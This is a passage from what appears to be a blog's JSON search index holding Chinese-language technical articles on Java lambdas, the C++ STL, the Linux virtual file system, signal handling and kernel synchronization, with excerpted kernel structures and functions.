s1.length-s2.length);//或者Arrays.sort(strings,(s1,s2)-&gt;s1.length-s2.length);//或者Arrays.sort(strings,(s1,s2)-&gt;&#123; int x= s1.length; int y=s2.length; return x-y;&#125;); Lambda的实现 lambda的原理就是以把接口当参数传递的方式来形成闭包．所以这个接口只能定义一个方法，这种接口叫函数接口.这种接口可以隐式转为lambda。 为了防止该接口的单方法性被破坏，Java8定义了一个注解FunctionInterface，Java库中所有这种接口都已经添加了这个注解。如： 1234 @FunctionInterfacepublic Interface Runable&#123; void run();&#125; 当然，自己也可以定义函数接口，很简单，只要是单方法都可以。最好是加上注解，防止自己或别人去添加新的方法。 另外Java8中提供了很多常用的接口，免得自己去创建。这些接口放在java.utils.function包里。 默认的接口可接收和返回的基本数据只有int,long,double三种，String视为对象。 Custmer一家，提供了void类的接口，可以接收单个或两个的基本数据类型或对象的参数(无参的有现成的Runable)。如： 1234567 interface Custmer&lt;T&gt;&#123; void apply(T t)&#125;interface BiConsumer&lt;T,U&gt;&#123; void apply(T t,U u);&#125; 另外还支持对象+基本数据类型的参数。 Predicate一家，提供了可接收1-2个基本数据类型或对象的参数，返回boolean的接口(无参的是booleanSupplier接口)。 Function,Oprator,Supplier一家，提供了接收0-2个参数，返回基本数据类型或对象的接口。 Function一家可接收1-2个参数，返回的是对象 Supplier一家不接收参数，返回基本数据类型和对象 Operator一家接收1-2个参数，返回同类型的数据。unary前缀的是接收一个参数，binary前缀的是接收两个参数。那个坑爹的(x,y)-&gt;x+y的例子就是由IntBinaryOperator接口来实现的。 123 interface IntBinaryOperator&#123; int applyAsInt(int left,int right);&#125; 默认提供的接口，如果是两个基本数据类型的参数，则参数的类型都必须是相同的.也就是说两个以内的参数基本上不用自己定义函数接口了。上面的例子就可以这样写： 12345678910111213 public static &lt;T&gt; String getIds(List&lt;T&gt; list,Function&lt;T,String&gt; interf)&#123; if(list==null||list.isEmpty)&#123; return null; &#125; StringBuilder builder = new StringBuilder(); for(T t:list)&#123; String id=interf.apply(t); builder.append(\",\").append(id); &#125; return builder.deleteCharAt(0).toString();&#125;//使用时如下 Utils.getIds(list,t-&gt;ooxx(t);) 函数式编程 函数式编程需要可以把函数当成参数，在Java中所有的东西都是需要有类型的，只有函数自身是没有的。Lambda以间接的方式提供了函数的类型，及类型的推导，为函数式编程清扫了最大的障碍。再配合新提供的Stream，在Java中终与可以愉快的的使用函数式编程了。 然而，没有Lambda,没有Java8,我用Rxjava一样可以愉快的函数式编程。 本文链接： http://www.meng.uno/articles/bbcf5ff7/ 欢迎转载！","categories":[{"name":"Java开发Tips","slug":"Java开发Tips","permalink":"http://www.meng.uno/categories/Java开发Tips/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://www.meng.uno/tags/Java/"},{"name":"language","slug":"language","permalink":"http://www.meng.uno/tags/language/"}]},{"title":"STL简介","slug":"stl","date":"2017-02-12T12:18:15.000Z","updated":"2018-02-18T10:38:20.010Z","comments":true,"path":"articles/5ae627d/","link":"","permalink":"http://www.meng.uno/articles/5ae627d/","excerpt":"STL简介 STL（Standard Template Library，标准模板库)是惠普实验室开发的一系列软件的统称。它是由Alexander Stepanov、Meng Lee和David R Musser在惠普实验室工作时所开发出来的。现在虽说它主要出现在C中，但在被引入C之前该技术就已经存在了很长的一段时间。 STL的代码从广义上讲分为三类：algorithm（算法），container（容器）和 iterator（迭代器），几乎所有的代码都采用了模板类和模版函数的方式，这相比于传统的由函数和类组成的库来说提供了更好的代码重用机会。在C++标准中，STL被组织为下面的13个头文件：","text":"STL简介 STL（Standard Template Library，标准模板库)是惠普实验室开发的一系列软件的统称。它是由Alexander Stepanov、Meng Lee和David R Musser在惠普实验室工作时所开发出来的。现在虽说它主要出现在C中，但在被引入C之前该技术就已经存在了很长的一段时间。 STL的代码从广义上讲分为三类：algorithm（算法），container（容器）和 iterator（迭代器），几乎所有的代码都采用了模板类和模版函数的方式，这相比于传统的由函数和类组成的库来说提供了更好的代码重用机会。在C++标准中，STL被组织为下面的13个头文件： 、 、 、 、 、 、、、、、、和。 算法 大家都能取得的一个共识是函数库对数据类型的选择对其可重用性起着至关重要的作用。 举例来说，一个求方根的函数，在使用浮点数作为其参数类型的情况下的可重用性肯定比使用整型作为它的参数类性要高。而C++通过模板的机制允许推迟对某些类型的选择，直到真正想使用模板或者说对模板进行特化的时候，STL就利用了这一点提供了相当多的有用算法。它是在一个有效的框架中完成这些算法的——你可以将所有的类型划分为少数的几类，然后就可以在模版的参数中使用一种类型替换掉同一种类中的其他类型。 STL提供了大约100个实现算法的模版函数，比如算法for_each将为指定序列中的每一个元素调用指定的函数，stable_sort以你所指定的规则对序列进行稳定性排序等等。这样一来，只要我们熟悉了STL之后，许多代码可以被大大的化简，只需要通过调用一两个算法模板，就可以完成所需要的功能并大大地提升效率。 算法部分主要由头文件，和组成。是所有STL头文件中最大的一个（尽管它很好理解），它是由一大堆模版函数组成的，可以认为每个函数在很大程度上都是独立的，其中常用到的功能范围涉及到比较、交换、查找、遍历操作、复制、修改、移除、反转、排序、合并等等。体积很小，只包括几个在序列上面进行简单数学运算的模板函数，包括加法和乘法在序列上的一些操作。中则定义了一些模板类，用以声明函数对象。 容器 在实际的开发过程中，数据结构本身的重要性不会逊于操作于数据结构的算法的重要性，当程序中存在着对时间要求很高的部分时，数据结构的选择就显得更加重要。 经典的数据结构数量有限，但是我们常常重复着一些为了实现向量、链表等结构而编写的代码，这些代码都十分相似，只是为了适应不同数据的变化而在细节上有所出入。STL容器就为我们提供了这样的方便，它允许我们重复利用已有的实现构造自己的特定类型下的数据结构，通过设置一些模版类，STL容器对最常用的数据结构提供了支持，这些模板的参数允许我们指定容器中元素的数据类型，可以将我们许多重复而乏味的工作简化。 容器部分主要由头文件, , , , , 和 组成。 对于常用的一些容器和容器适配器（可以看作由其它容器实现的容器），可以通过下表总结一下它们和相应头文件的对应关系。 数据结构 描述 实现头文件 向量(vector) 连续存储的元素 列表(list) 由节点组成的双向链表，每个结点包含着一个元素 双队列(deque) 连续存储的指向不同元素的指针所组成的数组 集合(set) 由节点组成的红黑树，每个节点都包含着一个元素，节点之间以某种作用于元素对的谓词排列，没有两个不同的元素能够拥有相同的次序 多重集合(multiset) 允许存在两个次序相等的元素的集合 栈(stack) 后进先出的值的排列 队列(queue) 先进先出的执的排列 优先队列(priority_queue) 元素的次序是由作用于所存储的值对上的某种谓词决定的的一种队列 映射(map) 由{键，值}对组成的集合，以某种作用于键对上的谓词排列 多重映射(multimap) 允许键对有相等的次序的映射 迭代器 下面要说的迭代器从作用上来说是最基本的部分，可是理解起来比前两者都要费力一些。软件设计有一个基本原则，所有的问题都可以通过引进一个间接层来简化，这种简化在STL中就是用迭代器来完成的。概括来说，迭代器在STL中用来将算法和容器联系起来，起着一种黏和剂的作用。几乎STL提供的所有算法都是通过迭代器存取元素序列进行工作的，每一个容器都定义了其本身所专有的迭代器，用以存取容器中的元素。 迭代器部分主要由头文件,和组成。是一个很小的头文件，它包括了贯穿使用在STL中的几个模板的声明，中提供了迭代器使用的许多方法，而对于的描述则十分的困难，它以不同寻常的方式为容器中的元素分配存储空间，同时也为某些算法执行期间产生的临时对象提供机制,中的主要部分是模板类allocator，它负责产生所有容器中的默认分配器。 本文链接： http://www.meng.uno/articles/5ae627d/ 欢迎转载！","categories":[{"name":"Language","slug":"Language","permalink":"http://www.meng.uno/categories/Language/"},{"name":"STL","slug":"Language/STL","permalink":"http://www.meng.uno/categories/Language/STL/"}],"tags":[{"name":"C++","slug":"C","permalink":"http://www.meng.uno/tags/C/"},{"name":"STL","slug":"STL","permalink":"http://www.meng.uno/tags/STL/"}]},{"title":"文件系统","slug":"file","date":"2017-01-14T05:39:44.000Z","updated":"2018-04-10T05:46:42.627Z","comments":true,"path":"articles/1b9c8662/","link":"","permalink":"http://www.meng.uno/articles/1b9c8662/","excerpt":"虚拟文件系统（VFS）的思想和作用 实际上，看到Virtaul，我们就应该想到VFS的作用，是虚拟出一个中间层，来实现某些部分的统一处理。实际上，VFS要解决的是，让应用能够“以一种通用的方式”，去访问不同类型的文件系统： 可以看到，对于不同类型的文件系统、网络文件系统、伪文件系统，应用对它们的操作接口都是一致的,而底层的驱动则会完成实际的区分工作。 通用文件模型 VFS通过一个通用文件模型，来表示一个文件系统，它从顶层到底层，一共维护四个数据结构。这里我们通过磁盘文件系统来举例子说明： * file：文件对象。如果一个进程要和一个对象进行交互，那么久要在访问期间存放一个文件对象在","text":"虚拟文件系统（VFS）的思想和作用 实际上，看到Virtaul，我们就应该想到VFS的作用，是虚拟出一个中间层，来实现某些部分的统一处理。实际上，VFS要解决的是，让应用能够“以一种通用的方式”，去访问不同类型的文件系统： 可以看到，对于不同类型的文件系统、网络文件系统、伪文件系统，应用对它们的操作接口都是一致的,而底层的驱动则会完成实际的区分工作。 通用文件模型 VFS通过一个通用文件模型，来表示一个文件系统，它从顶层到底层，一共维护四个数据结构。这里我们通过磁盘文件系统来举例子说明： file：文件对象。如果一个进程要和一个对象进行交互，那么久要在访问期间存放一个文件对象在内核内存中。 dentry：目录项对象。用来存放目录项和对应文件链接信息，每个磁盘文件系统，都有特殊的方式，将该类信息存在磁盘上。 inode：索引节点对象。用来存放关于具体文件的一般信息，对基于磁盘的文件系统来说，通常对应于存放在磁盘上的文件控制块，其节点号唯一标识文件系统中的文件。 superblock：超级块对象。对应安装的文件系统的信息，他对应磁盘上的文件系统控制块。 这张图反映出了在一次访问中，各个对象是如何参与到过程中去的。这里我为什么要把对象给加粗呢？VFS实际采用的是一种面向对象的方式（虽然它是用C语言写的）。每个object，都有一系列的“操作方式”，VFS为这些对象提供了“统一的”接口，而具体的文件系统则提供了千差万别的实现方式，这是由一个函数指针表来实现的。 文件对象 这里我们从文件对象开始说。如果留意进程的task_struct（定义在sched.h当中），你会发现一个fs_struct结构，以及一个files_struct结构。 其中fs_struct保存了当前点工作目录和根目录： struct fs_struct { int users; spinlock_t lock; seqcount_t seq; int umask; int in_exec; struct path root, pwd; }; 而files_struct结构则保存了当前进程所打开的所有文件，它们保存在fdtable中： struct fdtable { unsigned int max_fds; struct file __rcu **fd; /* current fd array */ unsigned long *close_on_exec; unsigned long *open_fds; struct rcu_head rcu; }; 当open()系统调用发生时，文件描述符实际上是fd中的下标。现在我们终于看到file结构了，这里我只列出了重要的部分： struct file { union { struct llist_node fu_llist; struct rcu_head fu_rcuhead; } f_u; struct path f_path; struct inode *f_inode; /* cached value */ const struct file_operations *f_op; struct mutex f_pos_lock; loff_t f_pos; } __attribute__((aligned(4))); 这里，loff_t是平时我们用来在文件读写上用于定位的指针，显然这个值必须放在file当中，因为可能会有几个进程同时访问一个文件。 而 f_op正反映出了“通用文件模型的”特点，它保存了文件操作的对应指针；这个值是在进程打开文件时，从文件索引节点中的i_fop中复制的。 当然在file中我们也看到了dentry和inode的影子：f_path包含了dentry *，而*f_indoe也是file的一个域，它们分别指向了对应文件点dentry对象和inode对象，我们将会在接下来对它们进行详细的说明。 目录项对象 在上一节中，我们知道了文件对象描述了应用和文件的联系。这里，目录项是用来描述具体的文件系统中的目录项的，他的作用是：用来快速找到一个路径，并且与文件相关联。假设进程需要查找一个路径，那么路径中的每一个分量，都会有一个目录项与之对应。并且，目录项会把每个分量和它对应的索引节点联系起来。dentry的定义如下： struct dentry { unsigned int d_flags; seqcount_t d_seq; struct hlist_bl_node d_hash; /* 哈希链表 */ struct dentry *d_parent; /* 父目录项 */ struct qstr d_name; /* 目录名 */ struct inode *d_inode; /* 对应的索引节点 */ unsigned char d_iname[DNAME_INLINE_LEN]; /* small names */ struct lockref d_lockref; /* per-dentry lock and refcount */ const struct dentry_operations *d_op; /* dentry操作 */ struct super_block *d_sb; /* 文件的超级块对象 */ unsigned long d_time; void *d_fsdata; struct list_head d_lru; /* LRU list */ struct list_head d_child; /* child of parent list */ struct list_head d_subdirs; /* our children */ union { struct hlist_node d_alias; /* inode alias list */ struct rcu_head d_rcu; } d_u; }; 这里可以看到，除开自身的名称、引用计数等，目录项对象中有这些关键的结构：d_op描述了目录项所对应的操作（通用模型的特点）；d_sb则是 文件的超级块对象，至于d_inode则是这个目录项关联的索引节点（当然它们并不是一一对应的关系）。注意，这里还有个很重要的变量：d_lockref，它其实就是一个计数器，说明了这个目录项对象的引用次数。 目录项对象保存在dentry cache中。linux操作系统为了提高目录项对象的处理效率，设计了这个高速缓存。这是因为，从磁盘中读取目录项，并且构造相应的目录项对象是需要花费大量的时间的，因此，在完成对目录项对象的操作之后，在内存中（尽量）保存它们具有很重要的意义。这个dentry cache，其本质是一个哈希链表，它定义在list_bl.h当中（它的hash计算在d_hash中完成）。我注意到，对于每一个dentry，都有一个d_flags，它的可能的值，定义在dcache.h当中。因为dentry cache的大小也是有限的，因此我们也不可能无限制地把dentry保存在cache中。因此linux首先把dentry的状态进行了定义： free：该状态目录项对象不包含有效信息，未被VFS使用 unused：目前没有被内核使用，d_count的值为0，d_inode仍然指向相关的索引节点 in use：正在被使用，d_count的值大于0，d_inode仍然指向相关的索引节点 negative：与目录项关联的索引节点不存在，相应的磁盘索引节点已经被删除（d_inode为负数）。 那么对于unused和negative这一类目录项，linux使用了一个LRU（最近最少使用）的双向链表，一旦dentry cache的大小吃紧，就从这个LRU链表中删除dentry。 索引节点对象 索引节点对象，是VFS当中最为重要的一个数据结构。它的作用是表示文件的相关信息。这里的相关信息，不包括文件本身的内容，而是诸如文件大小、拥有者、创建时间等信息。在一个文件被首次访问时，内核会在内存中构造它的索引节点对象。我们在操作系统中，可以任意修改一个文件的名字，但是索引节点和文件是一一对应的（由索引节点号标识），只要文件存在它就会存在（注意，超级块对象和索引节点对象在硬盘上都是有对应的实体数据结构的，在使用时利用硬盘上的内容，在内存中构造索引节点对象）。目录项是用来找到一个对应的索引节点实体，而具体与文件关联的工作则是由索引节点完成的。 让我们来看看索引节点的数据结构（只取了重要的部分），其定义在fs.h当中： struct inode { struct hlist_node i_hash; /* 散列表，用于快速查找inode */ struct list_head i_list; /* 相同状态索引节点链表 */ struct list_head i_sb_list; /* 文件系统中所有节点链表 */ struct list_head i_dentry; /* 目录项链表 */ unsigned long i_ino; /* 节点号 */ atomic_t i_count; /* 引用计数 */ unsigned int i_nlink; /* 硬链接数 */ uid_t i_uid; /* 使用者id */ gid_t i_gid; /* 使用组id */ struct timespec i_atime; /* 最后访问时间 */ struct timespec i_mtime; /* 最后修改时间 */ struct timespec i_ctime; /* 最后改变时间 */ const struct inode_operations *i_op; /* 索引节点操作函数 */ const struct file_operations *i_fop; /* 缺省的索引节点操作 */ struct super_block *i_sb; /* 相关的超级块 */ struct address_space *i_mapping; /* 相关的地址映射 */ struct address_space i_data; /* 设备地址映射 */ unsigned int i_flags; /* 文件系统标志 */ void *i_private; /* fs 私有指针 */ unsigned long i_state; }; 可以看到，inode同样采用了多个链表来保存。i_hash用来快速查找inode，i_list则是相同状态索引结点形成的双链表，这包含有未用索引节点链表，正在使用索引节点链表和脏索引节点链表等。 i_dentry是所有使用该节点的dentry链表。值得注意的是，inode不仅仅包含了自身索引节点的操作函数i_op，还有指向（缺省）文件操作的指针i_fop。当然，inode还会和super_block有联系。 i_sb是索引节点所在的超级块，而i_sb_list则是超级块中的所有节点的链表。 当在某个目录下创建、打开一个文件时，内核就会调用create()为这个文件创建一个inode。VFS通过inode的i_op-&gt;create()函数来完成这个工作；它将目录的inode、新打开文件的dentry、访问权限作为参数；lookup()函数用来查找指定文件的dentry，link()和symlink()分别用来创建硬链接和软链接。 超级块对象 与前面几类对象不同的是，超级块对象表述的内容更加庞大一些：它表示的是一个“已安装的文件系统”。它在文件系统安装时建立，在文件系统卸载时删除。其定义在fs.h当中，这里我只列举出了较为关键的域。 struct super_block { struct list_head s_list; //超级块链表的指针 dev_t s_dev; //设备标识符 unsigned char s_blocksize_bits; unsigned long s_blocksize; loff_t s_maxbytes; //文件的最长长度 struct file_system_type *s_type; const struct super_operations *s_op; //超级块的操作 const struct dquot_operations *dq_op; const struct quotactl_ops *s_qcop; const struct export_operations *s_export_op; unsigned long s_flags; //安装标识 struct dentry *s_root; //根目录的目录项 int s_count; const struct xattr_handler **s_xattr; struct list_head s_inodes; //所有的inodes链（打开文件的inodes链） struct block_device *s_bdev; //块设备 char s_id[32]; //块设备名称 u8 s_uuid[16]; //UUID fmode_t s_mode; char *s_subtype; const struct dentry_operations *s_d_op; //default d_op for dentries void *s_fs_indo; //文件系统的信息指针 }; 在linux中，每个超级块代表一个已安装的文件系统。所有的超级块链表，是以一种双向环形链表的形式链接在一起的。其prev、next保存在list_head域中。超级块对象中，保存有其根目录的dentry，以及其所有的inode。s_fs_info则指向了文件系统的超级块信息。而对于超级块来说，同样定义有s_op，也即超级块的操作表。 超级块一般是储存在磁盘的特定扇区当中，但如果是基于内存对文件系统，比如proc、sysfs，则是保存在内存当中，而超级块对象，则是在使用时创建的，它保存在内存中。 硬链接和软链接与复制 linux里面，可以把文件分成三个部分：文件名（dentry），inode，数据。 复制的定义很明确，就是为这三个部分，都创建一个新的副本。 硬链接的本质是一个“文件名”，一个文件可能有多个“文件名”，inode并不包含文件名，而只是有一个索引节点号。硬链接实际上就是为链接文件创建一个新的dentry，并将dentry写入父目录的数据中，而硬链接所对应的inode依然没有变。所以删除硬链接只是删除了dentry，而inode结点数减少1而已。 软链接就是一个普通的文件，只不过它的数据保存的是另一个文件的路径。软链接的创建，调用了__ext4_new_inode()来创建一个新的inode，并把dentry-&gt;name作为了它的内容。也就是说，软链接也同时创建了这三个部分。 二者的区别在哪里呢？首先，硬链接共享了inode，因此它不能跨文件系统；但是软链接不受这个限制。由于相同的原因，硬链接只能对存在的文件进行创建，而软链接不是。而且硬链接有可能会在目录中引入循环，所以不能指向目录；但软链接不会，因为它有一个inode实体可以跟踪。不过不论删除软链接还是硬链接，都不会对原文件、具有相同inode号的文件造成影响。但如果原文件被删除，软链接会变成死链接，硬链接不会，因为inode的计数并没有变成0。 路径名查找 每当进程需要识别一个文件时，就把它的文件路径名，传递给某个VFS系统调用，比如open()。在路径查找中，有个辅助的数据结构：nameidata，它用来向函数传递参数，并且保存查找的结果： struct nameidata { struct path path; struct qstr last; struct path root; struct inode *inode; /* path.dentry.d_inode */ unsigned int flags; unsigned seq, m_seq; int last_type; unsigned depth; struct file *base; char *saved_names[MAX_NESTED_LINKS + 1]; }; 在查找完成后，path中保存了目录项，depth表示了当前路径的深度，saved_names保存了符号链接处理中的路径名。 路径查找的复杂性，主要体现在VFS系统的一些特点上：（1）必须对目录的访问权限进行检查；（2）文件名可能是符号链接；（3）要考虑符号链接可能带来的循环引用；（4）文件名可能是文件系统的安装点（5）路径名和进程的命名空间有关等。 路径名查找的入口是path_lookup()，它调用了filename_lookup()。这个函数对nameidata进行了简单的填充，随后调用lookupat()。 lookupat()函数中通过一个循环，和path_init()函数，逐级向下进行查找，检查目录的访问权限，并且考虑符号链接等情况。 本文链接： http://www.meng.uno/articles/1b9c8662/ 欢迎转载！","categories":[{"name":"操作系统","slug":"操作系统","permalink":"http://www.meng.uno/categories/操作系统/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://www.meng.uno/tags/Linux/"},{"name":"文件系统","slug":"文件系统","permalink":"http://www.meng.uno/tags/文件系统/"}]},{"title":"信号","slug":"signal","date":"2017-01-12T05:26:36.000Z","updated":"2018-04-10T05:46:42.640Z","comments":true,"path":"articles/1d60a972/","link":"","permalink":"http://www.meng.uno/articles/1d60a972/","excerpt":"信号 信号用来通知进程异步事件，可以把它理解为对中断的一种模拟。它是一个很小的消息，用来达到两个目的： * 告知进程发生了一个特定的事件； * 强迫进程执行自身所包含的信号处理程序。 linux预先定义了一些常规信号，并为它们定义了一些缺省操作。除此之外，还有一类实时信号，它们需要排队进行处理，我们也可以自己定义信号和信号处理方式。 既然信号是和进程相关的，那么task_struct中就必然包含有与信号相关的域了。 task_struct{ ... struct signal_struct *signal; //进程信号描述符 struct sighand_struct *","text":"信号 信号用来通知进程异步事件，可以把它理解为对中断的一种模拟。它是一个很小的消息，用来达到两个目的： 告知进程发生了一个特定的事件； 强迫进程执行自身所包含的信号处理程序。 linux预先定义了一些常规信号，并为它们定义了一些缺省操作。除此之外，还有一类实时信号，它们需要排队进行处理，我们也可以自己定义信号和信号处理方式。 既然信号是和进程相关的，那么task_struct中就必然包含有与信号相关的域了。 task_struct{ ... struct signal_struct *signal; //进程信号描述符 struct sighand_struct *sighand; //进程信号处理程序描述符 sigset_t blocked; //被阻塞信号掩码 sigset_t real_bloced; //被阻塞信号临时掩码 struct sigpending pending; //存放私有挂起信号 ... } 信号的产生 信号是由内核函数产生的，它们完成信号处理的第一步，也即更新一个/多个进程的描述符。产生的信号并不直接传递，而是根据信号的类型、目标进程的状态唤醒进程，让它们来接收信号。内核提供了一组产生信号的函数，包括为进程、线程组产生信号等，但它们最终都会调用__send_signal()。当然，在调用__send_signal()之前，会检查这个信号是否应该被忽略（进程没有被跟踪、信号被阻塞，显示忽略信号） static int __send_signal(int sig, struct siginfo *info, struct task_struct *t, int group, int from_ancestor_ns) { struct sigpending *pending; struct sigqueue *q; int override_rlimit; int ret = 0, result; assert_spin_locked(&amp;t-&gt;sighand-&gt;siglock); result = TRACE_SIGNAL_IGNORED; if (!prepare_signal(sig, t, from_ancestor_ns || (info == SEND_SIG_FORCED))) goto ret; //获取进程或线程组的私有挂起队列 pending = group ? &amp;t-&gt;signal-&gt;shared_pending : &amp;t-&gt;pending; //这个信号已经挂起了，忽略它 result = TRACE_SIGNAL_ALREADY_PENDING; if (legacy_queue(pending, sig)) goto ret; result = TRACE_SIGNAL_DELIVERED; //如果是kernel内部的某些强制信号，就立马执行 if (info == SEND_SIG_FORCED) goto out_set; //如果没有超过挂起信号的上限 if (sig &lt; SIGRTMIN) override_rlimit = (is_si_special(info) || info-&gt;si_code &gt;= 0); else override_rlimit = 0; //产生一个sigqueue对象，并把它加入到队列中去 q = __sigqueue_alloc(sig, t, GFP_ATOMIC | __GFP_NOTRACK_FALSE_POSITIVE, override_rlimit); if (q) { list_add_tail(&amp;q-&gt;list, &amp;pending-&gt;list); switch ((unsigned long) info) { case (unsigned long) SEND_SIG_NOINFO: q-&gt;info.si_signo = sig; q-&gt;info.si_errno = 0; q-&gt;info.si_code = SI_USER; q-&gt;info.si_pid = task_tgid_nr_ns(current, task_active_pid_ns(t)); q-&gt;info.si_uid = from_kuid_munged(current_user_ns(), current_uid()); break; case (unsigned long) SEND_SIG_PRIV: q-&gt;info.si_signo = sig; q-&gt;info.si_errno = 0; q-&gt;info.si_code = SI_KERNEL; q-&gt;info.si_pid = 0; q-&gt;info.si_uid = 0; break; default: copy_siginfo(&amp;q-&gt;info, info); if (from_ancestor_ns) q-&gt;info.si_pid = 0; break; } //...... } 在信号产生之后，linux会调用signal_wake_up()通知进程，告知有新的挂起信号到来，如果当前进程占有了CPU，那么就可以立即执行；否则则要强制进行重新调度。 信号的传递 在信号产生之后，如何确保挂起的信号被正确的处理呢？进程在信号产生时，可能并不在CPU上运行。在进程恢复用户态执行时，会进行检查，如果存在非阻塞的挂起信号，就调用do_signal()，这个函数会逐个助理挂起的非阻塞信号，而信号的处理则进一步调用handle_signal()。 handle_signal(struct ksignal *ksig, struct pt_regs *regs) { bool stepping, failed; struct fpu *fpu = &amp;current-&gt;thread.fpu; //是否处于系统调用中 if (syscall_get_nr(current, regs) &gt;= 0) { //系统调用被打断了，没有执行完，需要重新执行 switch (syscall_get_error(current, regs)) { case -ERESTART_RESTARTBLOCK: case -ERESTARTNOHAND: regs-&gt;ax = -EINTR; break; case -ERESTARTSYS: if (!(ksig-&gt;ka.sa.sa_flags &amp; SA_RESTART)) { regs-&gt;ax = -EINTR; break; } /* fallthrough */ case -ERESTARTNOINTR: regs-&gt;ax = regs-&gt;orig_ax; regs-&gt;ip -= 2; break; } } //设置栈帧 failed = (setup_rt_frame(ksig, regs) &lt; 0); if (!failed) { regs-&gt;flags &amp;= ~(X86_EFLAGS_DF|X86_EFLAGS_RF|X86_EFLAGS_TF); /* * Ensure the signal handler starts with the new fpu state. */ if (fpu-&gt;fpstate_active) fpu__clear(fpu); } signal_setup_done(failed, ksig, stepping); } 这里存在一个问题：handle_signal()处于内核态中，但信号处理程序是在用户态定义的，因此这里存在着堆栈转换的问题。linux采用的方法是：把内核态堆栈中的硬件上下文，拷贝到当前进程的用户态堆栈中。而当信号处理程序完成时，会自动调用sigreturn()把硬件上下文拷贝回内核态堆栈中，并且恢复用户态堆栈中的内容。这里需要构造一个用户态栈帧： 首先内核需要把内核栈中的内容复制到用户态堆栈中去，把内核态堆栈的返回地址修改为信号处理程序的入口。注意，为了让信号处理程序结束时，能够清除栈上的内容，用户态堆栈还应该放入一个信号处理程序的返回地址，它指向__kernel_sigreturn()，把硬件上下文拷贝到内核态堆栈，然后把这个栈帧删除，随后从内核态返回到用户态继续执行。 信号的接口 kill/tkill/kgill系统调用分别用来给某个进程、线程组发送信号。其中，kill(pid, sig)分别接受一个进程的pid号，以及一个所发送的信号。 实时信号的发送则应该使用rt_sigqueueinfo()来进行发送。如果用户需要为信号指定一个操作，那么则应该使用sigaction(sig, &amp;act, &amp;oact)系统调用，act为指定的操作，而old_act用来记录以前的信号。 本文链接： http://www.meng.uno/articles/1d60a972/ 欢迎转载！","categories":[{"name":"操作系统","slug":"操作系统","permalink":"http://www.meng.uno/categories/操作系统/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://www.meng.uno/tags/Linux/"},{"name":"信号","slug":"信号","permalink":"http://www.meng.uno/tags/信号/"}]},{"title":"内核同步","slug":"kernel","date":"2017-01-10T05:11:05.000Z","updated":"2018-04-10T05:46:42.631Z","comments":true,"path":"articles/e41a0c57/","link":"","permalink":"http://www.meng.uno/articles/e41a0c57/","excerpt":"内核同步 对于内核，其实有一个很形象的理解：我们可以把内核理解成一个服务器，它为自身和用户提供各种服务。因此它必须要保证每项服务在处理时，不会互相造成影响，也就是解决“并发”的问题。自身的请求，也即中断；客户的请求，也即用户态的系统调用或异常。内核的同步，就是对内核中的任务进行调度，使它们按照正确的方式运行。 内核抢占 这里，“内核抢占”指的是进程A在内核态运行时，被具有更高优先级的进程B取代，也就是发生了进程上下文的切换。而我们知道，中断上下文是不包括进程信息的，不能被调度。所以只要在中断上下文中，就不能进行“进程切换”。因此硬中断和软中断在执行时都不允许内核抢占；只有在内核执行异常处理程","text":"内核同步 对于内核，其实有一个很形象的理解：我们可以把内核理解成一个服务器，它为自身和用户提供各种服务。因此它必须要保证每项服务在处理时，不会互相造成影响，也就是解决“并发”的问题。自身的请求，也即中断；客户的请求，也即用户态的系统调用或异常。内核的同步，就是对内核中的任务进行调度，使它们按照正确的方式运行。 内核抢占 这里，“内核抢占”指的是进程A在内核态运行时，被具有更高优先级的进程B取代，也就是发生了进程上下文的切换。而我们知道，中断上下文是不包括进程信息的，不能被调度。所以只要在中断上下文中，就不能进行“进程切换”。因此硬中断和软中断在执行时都不允许内核抢占；只有在内核执行异常处理程序（尤其是系统调用），并且内核抢占没有被显示禁用时，才能进行内核抢占。CPU必须打开本地中断，才能完成内核抢占。 从另一个角度来说，CPU在任何情况下，都处于三种上下文情况之一： 运行在用户空间，执行用户进程； 运行在内核空间，处于进程上下文； 运行在内核空间，处于中断上下文。 在关于中断的博文里，我已经写过，中断上下文是不属于任何进程的，它和current没有任何关系。由于没有任何进程背景，在中断上下文中也不能发生睡眠，否则是不能对它进行调度。因此中断上下文中只能用锁进行同步，中断上下文也叫做原子上下文。而异常和系统调用陷入内核时，是出于进程上下文的，因此可以通过current关联相应的任务。所以在进程上下文中，可以发生睡眠，也可以使用信号量；当然也可以使用锁。 ps：以上说的是内核抢占的情况；用户抢占指的是另一个概念，指的是内核即将返回用户空间的时候，如果need_resched标志被设置，就会调用schedule()，选择一个更为合适的进程运行。 内核不能被抢占的情况有这些： 内核正在进行中断处理。在linux下，进程不能抢占中断（注意，中断是可以抢占、中止其他中断的），中断历程中不允许进行进程调度（schedule()会进行判断，如果在中断中会报错）。这也包括软中断的Bottom half部分。 当前的代码段持有自旋锁、读写锁，这些锁保证SMP系统CPU并发的正确性，此时不能进行抢占。 内核正在执行调度程序时，不应该进行抢占。 内核正在对每CPU数据进行操作。 除此之外的情况，都可以发生内核抢占。 每CPU变量 把内核变量，声明为每个CPU所独有的，它是数组结构的数组，每个CPU对应数组的一个元素，CPU直接不能访问其他CPU对应的数组元素，只能读写自身的元素，因此也不会出现竞争条件。但这同样存在着限制：必须确定CPU上的数据是各自独立的。 但是每CPU变量不能解决内核抢占的问题，他只能解决多CPU的问题，因此在访问时应当禁用抢占。 原子操作 通过保证操作在芯片上是原子级的，保证“读－修改－写”指令不会引发竞争。任何一个这样的操作，都必须以单个指令执行，并且不能中断，避免其他CPU访问这个单元。除了常见的0或1次对齐内存访问的汇编指令、单处理器下的“读－修改－写”指令、前缀为lock的指令也是原子操作指令。 优化和内存屏障 优化屏障主要是用来保证编译时，汇编语言指令按照原顺序来执行，而不进行重排。例如在linux中，barrier()的本质就是asm volatile(&quot;&quot;:::&quot;memory&quot;)。而内存屏障则是保证原语前后的指令执行顺序，也即在执行原语后的指令时，原语前的指令必须已经执行完了。 自旋锁 自旋锁是一类特别广泛使用的同步技术，如果内核控制路径必须访问共享数据结构，或者访问临界区，那么就需要为自己获取一个自旋锁；只有资源是空闲时，获取才能成功；当它释放了锁之后，其他内核控制路径就可以进入房间了。那么自旋锁的意义是什么？它是多处理器环境下一种特殊的锁；如果执行路径发现自旋锁是锁着的，或反复在周围进行“旋转”，反复执行循环，直到锁被释放（忙等）。 